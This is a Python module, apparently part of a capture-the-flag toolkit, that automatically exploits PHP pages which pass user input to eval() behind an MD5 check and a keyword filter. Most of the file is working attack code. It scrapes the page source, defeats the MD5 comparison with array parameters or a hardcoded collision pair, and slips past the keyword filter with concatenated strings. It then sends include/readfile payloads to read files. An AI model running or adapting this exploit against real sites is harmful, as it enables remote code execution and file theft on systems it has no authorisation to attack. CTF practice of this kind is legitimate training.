# -*- coding: utf-8 -*-
"""
PHP MD5 Collision + eval() RCE 通用求解引擎 v1.0

覆盖的题型:
- PHP md5($r1)===md5($r2) && $r1!==$r2 碰撞检查
- eval($r3) 代码执行 + WAF 关键字黑名单
- WAF 只挡完整 keyword（cat/flag/system/ls/echo...），不挡单字母
- 字符串拼接绕过关键字符号（'fl'.'ag' → flag，源码无连续子串）

入口: auto_solve(url, on_progress) → dict with flag/status

区别于其他模块:
- php_unserialize.py → 目标 unserialize()，非 eval()
- bashfuck_solver.py → 目标 system($cmd) 注入，非 eval()
- php_lfi.py → 目标 include $_GET[...]，非 eval()
"""

from __future__ import annotations
import re
import urllib.request
import urllib.parse
import ssl
import html as _html
from typing import Optional, Callable, Dict, List, Tuple

__all__ = ['auto_solve', 'php_eval_rce_solve']

# ═══════════════════════════════════════════════════════════
#  HTTP utilities (local copy to avoid circular imports)
# ═══════════════════════════════════════════════════════════

_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'


def _http_raw(url: str, timeout: int = 8, data: Optional[bytes] = None,
              method: str = 'GET') -> Tuple[Optional[int], Optional[bytes], Optional[str]]:
    try:
        req = urllib.request.Request(url, data=data, method=method,
            headers={'User-Agent': _USER_AGENT, 'Accept': '*/*',
                     'Content-Type': 'application/x-www-form-urlencoded'})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read(), None
    except Exception as e:
        return None, None, str(e)


def _http_get(url: str, timeout: int = 8) -> Tuple[Optional[int], Optional[bytes], Optional[str]]:
    return _http_raw(url, timeout)


def _http_post(url: str, data: bytes, timeout: int = 8) -> Tuple[Optional[int], Optional[bytes], Optional[str]]:
    return _http_raw(url, timeout, data, 'POST')


def decode_body(body: Optional[bytes]) -> str:
    if body is None:
        return ""
    for enc in ('utf-8', 'gbk', 'latin-1'):
        try:
            return body.decode(enc)
        except UnicodeDecodeError:
            continue
    return body.decode('utf-8', errors='replace')


# ═══════════════════════════════════════════════════════════
#  检测
# ═══════════════════════════════════════════════════════════

# eval($rce3) / eval($real_code) / eval($_POST['x']) 等模式
_EVAL_RE = re.compile(r'eval\s*\(\s*\$\w+\s*\)', re.IGNORECASE)

# MD5 碰撞检查: md5($r1) === md5($r2) / md5($r1)==md5($r2)
_MD5_COLLIDE_RE = re.compile(
    r'md5\s*\(\s*\$\w+\s*\)\s*={2,3}\s*md5\s*\(\s*\$\w+\s*\)',
    re.IGNORECASE
)

# WAF 检测: preg_match(pattern, ...)
_WAF_RE = re.compile(r'preg_match\s*\(', re.IGNORECASE)

# 检测 PHP 源码中的 eval 参数来源
# eval($real_code) 中 $real_code 的来源: $_GET['x'], $_POST['x'], $_COOKIE['x']
_EVAL_PARAM_RE = re.compile(
    r'\$\w+\s*=\s*\$_((?:GET|POST|COOKIE|REQUEST))\s*\[\s*[\'"](\w+)[\'"]\s*\]',
    re.IGNORECASE
)

# eval 参数直接引用: eval($_POST['rce3'])
_EVAL_DIRECT_RE = re.compile(
    r'eval\s*\(\s*\$_(GET|POST|COOKIE|REQUEST)\s*\[\s*[\'"](\w+)[\'"]\s*\]\s*\)',
    re.IGNORECASE
)

# MD5 参数来源: $rce1 = $_GET['rce1']
_MD5_PARAM_RE = re.compile(
    r'\$(\w+)\s*=\s*\$_(GET|POST|COOKIE|REQUEST)\s*\[\s*[\'"](\w+)[\'"]\s*\]\s*;(?:(?!\$\w+\s*=).)*?md5\s*\(\s*\$\1\s*\)',
    re.IGNORECASE | re.DOTALL
)

# WAF 中提取黑名单关键字
_WAF_KEYWORDS_RE = re.compile(
    r'(?:system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)',
    re.IGNORECASE
)

# Real MD5 collision (64-byte pair, both → 008ee33a9d58b51cfeb425b0959121c9)
# Used when PHP 8+ array bypass fails (TypeError on md5(array))
_MD5_COLLISION = (
    bytes.fromhex('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2'),
    bytes.fromhex('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2'),
)

# ═══════════════════════════════════════════════════════════
#  Flag 提取
# ═══════════════════════════════════════════════════════════

_FLAG_RE = re.compile(r'[A-Za-z0-9_]{2,}\{[^}]{4,}\}')
_BAD_HTML = re.compile(r'&nbsp;|&lt;|&gt;|&amp;|<br|<span|else\{|echo[\s"]|function[\s(]|isset\(|preg_match')


def extract_flag(text: str) -> Optional[str]:
    if not text:
        return None
    for m in _FLAG_RE.finditer(text):
        candidate = m.group(0)
        if not _BAD_HTML.search(candidate):
            return candidate
    return None


# ═══════════════════════════════════════════════════════════
#  源码解析
# ═══════════════════════════════════════════════════════════

def _strip_html(source: str) -> str:
    """剥离 HTML 标签（highlight_file 输出），还原纯 PHP 源码."""
    # 先解码 HTML 实体
    text = _html.unescape(source)
    # 剥离 HTML 标签
    text = re.sub(r'<[^>]+>', '', text)
    # 还原 HTML 实体空格（unescape 把 &nbsp; 变成 \xa0，Python \s 不匹配它）
    text = text.replace('\xa0', ' ').replace('&nbsp;', ' ')
    return text


def _parse_eval_params(php_source: str) -> List[Dict]:
    """
    解析 eval() 的参数来源和 MD5 碰撞参数.
    
    Returns:
        [{eval_param, eval_source(GET/POST/COOKIE), eval_key,
          md5_params: [{name, source(GET/POST), key}], 
          waf_blocked_keywords: [str], ...}]
    """
    src = _strip_html(php_source)
    results = []
    
    # 1. 找 eval() 调用
    eval_matches = list(_EVAL_RE.finditer(src))
    if not eval_matches:
        # 也尝试匹配 eval($_POST['x']) 直接形式
        eval_matches = list(_EVAL_DIRECT_RE.finditer(src))
    
    if not eval_matches:
        return results
    
    # 2. 找 MD5 碰撞
    has_md5 = bool(_MD5_COLLIDE_RE.search(src))
    
    # 3. 找 WAF
    has_waf = bool(_WAF_RE.search(src))
    
    # 4. 提取所有 $_GET/$_POST 参数赋值（用于追踪变量名→参数名映射）
    param_map = {}  # var_name → {source, key}
    for m in re.finditer(
        r'\$([_a-z0-9]+)\s*=\s*\$_((?:GET|POST|COOKIE|REQUEST))\s*\[\s*[\'"](\w+)[\'"]\s*\]',
        src, re.IGNORECASE
    ):
        param_map[m.group(1)] = {'source': m.group(2).upper(), 'key': m.group(3)}
    
    # 5. 对每个 eval，追踪其参数变量到实际来源
    for em in eval_matches:
        # 尝试匹配 eval($var_name) 形式
        var_m = re.match(r'eval\s*\(\s*\$(\w+)\s*\)', em.group(0), re.IGNORECASE)
        eval_key = None
        eval_source = None
        
        if var_m:
            eval_var = var_m.group(1)
            if eval_var in param_map:
                eval_key = param_map[eval_var]['key']
                eval_source = param_map[eval_var]['source']
        
        # 尝试 eval($_POST['x']) 直接形式
        direct_m = _EVAL_DIRECT_RE.search(em.group(0))
        if direct_m and not eval_key:
            eval_source = direct_m.group(1).upper()
            eval_key = direct_m.group(2)
        
        if not eval_key:
            continue
        
        # 6. 收集 MD5 相关参数
        md5_params = []
        if has_md5:
            for name, info in param_map.items():
                if name != eval_var if var_m else True:
                    # 确认这个参数真的出现在 md5() 调用附近
                    if re.search(rf'md5\s*\(\s*\$' + re.escape(name) + r'\s*\)', src, re.IGNORECASE):
                        md5_params.append(info)
        
        # 7. 提取 WAF 中被挡的关键字
        blocked_words = set()
        if has_waf:
            # 方法1: preg_match 参数中直接写的 pattern
            waf_m = re.search(
                r"preg_match\s*\(\s*['\"](/[^/]+/)[a-z]*['\"]\s*,",
                src, re.IGNORECASE
            )
            if waf_m:
                pattern = waf_m.group(1)
                for kw in _WAF_KEYWORDS_RE.finditer(pattern):
                    blocked_words.add(kw.group(0).lower())
            
            # 方法2: pattern 先赋给变量 ($pattern = '/.../i')
            if not blocked_words:
                waf_var_m = re.search(
                    r'\$\w+\s*=\s*[\'"](\/[^\/]+\/)[a-z]*[\'"]',
                    src, re.IGNORECASE
                )
                if waf_var_m:
                    pattern = waf_var_m.group(1)
                    for kw in _WAF_KEYWORDS_RE.finditer(pattern):
                        blocked_words.add(kw.group(0).lower())
        
        results.append({
            'eval_key': eval_key,
            'eval_source': eval_source or 'POST',
            'has_md5': has_md5,
            'has_waf': has_waf,
            'md5_params': md5_params,
            'blocked_words': sorted(blocked_words),
        })
    
    return results


# ═══════════════════════════════════════════════════════════
#  Payload 生成
# ═══════════════════════════════════════════════════════════

def _break_keyword(kw: str) -> str:
    """用字符串拼接拆分关键字，使源码中不出现连续子串.

    例: 'flag' → 'fl'.'ag'
        'cat'  → 'c'.'at'
    """
    if len(kw) < 3:
        return kw  # 太短，不拆
    # 在第一/二个字符后拆分
    split_at = len(kw) // 2
    return repr(kw[:split_at]) + '.' + repr(kw[split_at:])


def _build_path(path: str, blocked_words: List[str]) -> str:
    """构造文件路径，拆分每个被挡关键字."""
    parts = []
    remaining = path
    while remaining:
        matched = False
        for kw in blocked_words:
            if kw and len(kw) >= 2 and remaining.lower().startswith(kw.lower()):
                parts.append(_break_keyword(remaining[:len(kw)]))
                remaining = remaining[len(kw):]
                matched = True
                break
        if not matched:
            # 取一个安全字符
            parts.append(repr(remaining[0]))
            remaining = remaining[1:]
    return '.'.join(parts) if len(parts) > 1 else parts[0]


def _generate_payloads(eval_key: str, blocked_words: List[str]) -> List[Tuple[str, str]]:
    """
    生成候选 payload 列表.
    
    Returns:
        [(payload, description), ...]
    """
    payloads = []
    
    # 已知 flag 路径
    flag_paths = [
        '/flag',       # 最常见
        '/flag.txt',
        '/fla',        # 偶尔的文件名
        './flag',      # 相对路径
        '../flag',
        '../../flag',
        '../../../flag',
    ]
    
    # 去除使用了被挡词的原路径，保留拆分后的
    safe_paths = []
    for p in flag_paths:
        safe = p
        for kw in blocked_words:
            if kw and kw in safe.lower():
                safe = _build_path(safe, blocked_words)
                break
        safe_paths.append(safe)
    
    # 去重
    safe_paths = list(dict.fromkeys(safe_paths))
    
    # 安全函数（不被 WAF 拦截的）
    # 这些函数不会出现在 blocked_words 中
    safe_funcs = [
        "include",       # include('/flag')
        "require",       # require('/flag')
        "readfile",      # readfile('/flag') → 直接输出
        "file_get_contents",  # 可能比其他安全
        "show_source",   # 等同于 highlight_file
        "highlight_file",
    ]
    
    # 过滤被挡的函数
    for kw in blocked_words:
        safe_funcs = [f for f in safe_funcs if kw not in f.lower()]
    
    # 生成 payload
    for func in safe_funcs[:3]:  # 只用前3个最可靠的
        for path in safe_paths[:5]:  # 只用前5个路径
            # 构造: func(path)
            if '.' in path:
                # 已经是拼接形式
                payload = f"{func}({path})"
            elif any(kw in path.lower() for kw in blocked_words if kw):
                # 需要拼接
                safe = _build_path(path, blocked_words)
                payload = f"{func}({safe})"
            else:
                payload = f"{func}({path!r})"
            
            # WAF self-check: 确认 payload 不含任何 blocked word
            safe = True
            for kw in blocked_words:
                if kw and kw in payload.lower():
                    safe = False
                    break
            if not safe:
                continue
            
            payloads.append((payload, f"{func} → {path}"))
    
    # 如果所有函数都被挡了，尝试 die + include
    if not payloads:
        # 最后手段: 直接用 include 拼接路径
        for path in safe_paths[:3]:
            p = _build_path('/flag', blocked_words) if '/flag' not in safe_paths else path
            payload = f"include({p})"
            safe = True
            for kw in blocked_words:
                if kw and kw in payload.lower():
                    safe = False
                    break
            if safe:
                payloads.append((payload, f"include → {p}"))
    
    return payloads


# ═══════════════════════════════════════════════════════════
#  主求解流程
# ═══════════════════════════════════════════════════════════

def php_eval_rce_solve(url: str, on_progress: Optional[Callable[[str], None]] = None) -> Dict:
    """
    求解 PHP eval RCE 题目（带 MD5 碰撞 + WAF 绕过）.
    
    Args:
        url: 题目 URL
        on_progress: 进度回调，接收状态字符串
    
    Returns:
        {flag, status, strategy, messages}
    """
    def emit(msg: str):
        if on_progress:
            on_progress(msg)
    
    results = {'flag': None, 'status': 'no_match', 'strategy': '', 'messages': []}
    
    # ── Phase 1: 获取源码 ──
    emit("[eval_rce] Fetching source...")
    code, body, err = _http_get(url, timeout=10)
    if code is None:
        results['status'] = 'connection_failed'
        results['messages'].append(f'Connection failed: {err}')
        return results
    
    raw_text = decode_body(body)
    php_source = _strip_html(raw_text)
    
    # ── Phase 2: 检测 eval() 模式 ──
    emit("[eval_rce] Detecting eval() pattern...")
    params = _parse_eval_params(php_source)
    if not params:
        results['status'] = 'no_eval_detected'
        results['messages'].append('No eval() with user-controlled parameter found')
        return results
    
    info = params[0]
    emit(f"[eval_rce] Found eval({info['eval_key']}) via ${info['eval_source']}, "
         f"MD5={'yes' if info['has_md5'] else 'no'}, "
         f"WAF={'yes' if info['has_waf'] else 'no'}")
    if info['blocked_words']:
        emit(f"[eval_rce] Blocked words: {info['blocked_words']}")
    
    # ── Phase 3: 确定 MD5 绕过策略 ──
    md5_strategy = None
    if info['has_md5']:
        # 策略: 数组绕过 (最通用)
        # GET: rce1[]=1, POST: rce2[]=2
        md5_strategy = {
            'get_params': {},  # 追加到 URL
            'post_params': {},  # 追加到 POST body
        }
        if info['md5_params']:
            for mp in info['md5_params']:
                if mp['source'] == 'GET':
                    md5_strategy['get_params'][mp['key'] + '[]'] = '1'
                else:
                    md5_strategy['post_params'][mp['key'] + '[]'] = '2'
        else:
            # Fallback: 用 rce1/rce2 这两个最常见名称
            md5_strategy['get_params']['rce1[]'] = '1'
            md5_strategy['post_params']['rce2[]'] = '2'
        
        emit("[eval_rce] MD5 bypass: array technique (PHP <8)")
        # Also prepare real MD5 collision fallback for PHP 8+
        _md5_coll_get = {}
        _md5_coll_post = {}
        if info['md5_params']:
            for mp in info['md5_params']:
                if mp['source'] == 'GET':
                    _md5_coll_get[mp['key']] = urllib.parse.quote_from_bytes(_MD5_COLLISION[0])
                else:
                    _md5_coll_post[mp['key']] = urllib.parse.quote_from_bytes(_MD5_COLLISION[1])
        else:
            _md5_coll_get['rce1'] = urllib.parse.quote_from_bytes(_MD5_COLLISION[0])
            _md5_coll_post['rce2'] = urllib.parse.quote_from_bytes(_MD5_COLLISION[1])
    
    # ── Phase 4: 生成 payload ──
    payloads = _generate_payloads(info['eval_key'], info['blocked_words'])
    if not payloads:
        results['status'] = 'no_payload'
        results['messages'].append('Could not generate safe payload (all functions blocked)')
        return results
    
    emit(f"[eval_rce] Generated {len(payloads)} candidate payload(s)")
    
    # ── Phase 5: 发送 payload ──
    for payload, desc in payloads:
        emit(f"[eval_rce] Trying: {desc}")
        
        try:
            if info['eval_source'] in ('GET', 'REQUEST'):
                # GET 参数评估
                test_url = url
                if '?' in test_url:
                    test_url += '&'
                else:
                    test_url += '?'
                
                # 加 MD5 参数
                get_params = dict(md5_strategy['get_params']) if md5_strategy else {}
                get_params[info['eval_key']] = payload
                test_url += urllib.parse.urlencode(get_params)
                
                # POST 参数（如果有）
                post_data = None
                if md5_strategy and md5_strategy['post_params']:
                    post_data = urllib.parse.urlencode(md5_strategy['post_params']).encode()
                
                code, body, _ = _http_raw(test_url, timeout=12, data=post_data,
                                          method='POST' if post_data else 'GET')
            else:
                # POST 参数评估
                post_params = dict(md5_strategy['post_params']) if md5_strategy else {}
                post_params[info['eval_key']] = payload
                post_data = urllib.parse.urlencode(post_params).encode()
                
                # GET 参数
                test_url = url
                if md5_strategy and md5_strategy['get_params']:
                    test_url += ('&' if '?' in test_url else '?') + \
                                urllib.parse.urlencode(md5_strategy['get_params'])
                
                code, body, _ = _http_post(test_url, post_data, timeout=12)
            
            if body is None:
                continue
            
            text = decode_body(body)
            
            # 提取 flag（过滤 HTML artifacts）
            flag = extract_flag(text)
            if flag:
                results['flag'] = flag
                results['status'] = 'success'
                results['strategy'] = f'eval_rce:{desc}'
                emit(f"[eval_rce] FLAG: {flag}")
                return results
            
            # 检查是否有效执行（响应变化了）
            if len(text) != 0:
                # 可能返回了非 flag 内容，标记但不放弃
                results['messages'].append(f'Payload {desc}: got {len(text)} bytes but no flag')
        except Exception as e:
            results['messages'].append(f'Payload {desc}: error {e}')
    
    # ── Phase 6: 真 MD5 碰撞回退（PHP 8+ array bypass 失效时）──
    if not results['flag'] and info.get('has_md5') and _md5_coll_get:
        emit("[eval_rce] Array bypass empty, trying real MD5 collision...")
        for payload, desc in payloads[:3]:  # 仅前3个 payload
            emit(f"[eval_rce] Real-MD5: {desc}")
            try:
                if info['eval_source'] in ('GET', 'REQUEST'):
                    test_url = url + ('&' if '?' in url else '?') + \
                        urllib.parse.urlencode(_md5_coll_get) + '&' + \
                        urllib.parse.urlencode({info['eval_key']: payload})
                    post_data = urllib.parse.urlencode(_md5_coll_post).encode() if _md5_coll_post else None
                    code, body, _ = _http_raw(test_url, timeout=12, data=post_data,
                                              method='POST' if post_data else 'GET')
                else:
                    test_url = url
                    if _md5_coll_get:
                        test_url += ('&' if '?' in url else '?') + urllib.parse.urlencode(_md5_coll_get)
                    md5_post = dict(_md5_coll_post)
                    md5_post[info['eval_key']] = payload
                    post_data = urllib.parse.urlencode(md5_post).encode()
                    code, body, _ = _http_post(test_url, post_data, timeout=12)
                
                if body:
                    text = decode_body(body)
                    flag = extract_flag(text)
                    if flag:
                        results['flag'] = flag
                        results['status'] = 'success'
                        results['strategy'] = f'eval_rce:real_md5:{desc}'
                        emit(f"[eval_rce] FLAG: {flag}")
                        return results
            except Exception as e:
                results['messages'].append(f'Real-MD5 {desc}: error {e}')
    
    if not results['flag']:
        results['status'] = 'no_flag'
        results['messages'].append(f'Tried {len(payloads)} payload(s), no flag found')
    
    return results


def auto_solve(url: str, on_progress: Optional[Callable[[str], None]] = None) -> Dict:
    """入口函数，与 php_unserialize / php_lfi 保持一致."""
    return php_eval_rce_solve(url, on_progress)
